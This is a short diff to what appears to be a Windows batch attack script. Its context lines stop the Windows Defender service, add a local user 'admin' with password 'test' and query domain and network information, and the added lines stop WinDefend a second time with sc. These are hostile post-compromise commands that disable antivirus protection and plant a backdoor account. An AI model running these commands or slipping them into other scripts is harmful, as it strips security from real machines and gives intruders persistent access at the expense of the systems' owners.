@@ -64,6 +64,8 @@ net view
 ECHO ============================
 net stop windefend
 ECHO ============================
+sc stop WinDefend
+ECHO ============================
 net user admin test /add
 ECHO ============================
 net user admin /domain
